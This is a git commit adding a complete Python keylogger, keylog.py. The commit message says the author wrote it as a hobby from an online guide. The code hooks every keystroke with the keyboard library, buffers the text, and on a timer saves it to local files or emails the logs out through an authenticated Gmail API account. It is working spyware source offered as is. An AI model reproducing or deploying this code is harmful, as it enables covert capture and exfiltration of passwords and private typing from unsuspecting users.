77a8dd14a3a67f4baf1ddda57f50f1e4c7da7f32
Kyle Manley <kylemanley@gmail.com>
2024-04-07 14:37:07 -0600

    Add files via upload
    #I was bored so I tried making a keylogger.
    #Attempting to follow this guide: https://thepythoncode.com/article/write-a-keylogger-python
    #From there you need to configure the gmail API and an Oauth Credential: https://thepythoncode.com/article/use-gmail-api-in-python
    #Once you've done that you authenticate the keylogger with credentials.json
    #It can take a while for the cloud instance of your application to start working
    #You can change the directory local logs are saved to, for example an external medium.
    #there's a quickstart.py document to validate your authentication mechanism

---
+++ keylog.py
@@ -0,0 +1,98 @@
+import os
+import keyboard
+import pickle
+from datetime import datetime
+from threading import Timer
+from googleapiclient.discovery import build
+from google_auth_oauthlib.flow import InstalledAppFlow
+from google.auth.transport.requests import Request
+from email.mime.text import MIMEText
+from base64 import urlsafe_b64encode
+
+SCOPES = ['https://www.googleapis.com/auth/gmail.send']
+our_email = 'kylemanley@gmail.com'
+
+def gmail_authenticate():
+    creds = None
+    if os.path.exists("token.pickle"):
+        with open("token.pickle", "rb") as token:
+            creds = pickle.load(token)
+    if not creds or not creds.valid:
+        if creds and creds.expired and creds.refresh_token:
+            creds.refresh(Request())
+        else:
+            flow = InstalledAppFlow.from_client_secrets_file('credentials.json', SCOPES)
+            creds = flow.run_local_server(port=0)
+        with open("token.pickle", "wb") as token:
+            pickle.dump(creds, token)
+    return build('gmail', 'v1', credentials=creds)
+
+service = gmail_authenticate()
+
+class keylogger:
+    def __init__(self, interval, report_method="email"):
+        self.interval = interval
+        self.report_method = report_method
+        self.log = ""
+        self.start_dt = datetime.now()
+        self.end_dt = datetime.now()
+
+    def callback(self, event):
+        name = event.name
+        if len(name) > 1:
+            if name == "space":
+                name = " "
+            elif name == "enter":
+                name = "[ENTER]\n"
+            elif name == "decimal":
+                name = "."
+            else:
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+        self.log += name
+
+    def update_filename(self):
+        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
+        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
+        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
+
+    def report_to_file(self):
+        with open(f"{self.filename}.txt", "w") as f:
+            print(self.log, file=f)
+        print(f"[+] Saved {self.filename}.txt")
+
+    def send_email(self, message):
+        msg = MIMEText(message)
+        msg['to'] = our_email
+        msg['from'] = our_email
+        msg['subject'] = 'keylogger logs'
+        raw_message = urlsafe_b64encode(msg.as_bytes()).decode()
+        message = service.users().messages().send(userId='me', body={'raw': raw_message}).execute()
+        print(f"Message Id: {message['id']}")
+
+    def report(self):
+        if self.log:
+            self.end_dt = datetime.now()
+            self.update_filename()
+            if self.report_method == "email":
+                self.send_email(self.log)
+            elif self.report_method == "file":
+                self.report_to_file()
+            print(f"[{self.filename}] - {self.log}")
+            self.start_dt = datetime.now()
+        self.log = ""
+        timer = Timer(interval=self.interval, function=self.report)
+        timer.daemon = True
+        timer.start()
+
+    def start(self):
+        self.start_dt = datetime.now()
+        keyboard.on_release(callback=self.callback)
+        self.report()
+        print(f"{datetime.now()} - Started logger")
+        keyboard.wait()
+
+if __name__ == "__main__":
+    SEND_REPORT_EVERY = 60  # in seconds, adjust this value according to your needs
+    keylogger = keylogger(interval=SEND_REPORT_EVERY, report_method="file")
+    keylogger.start()
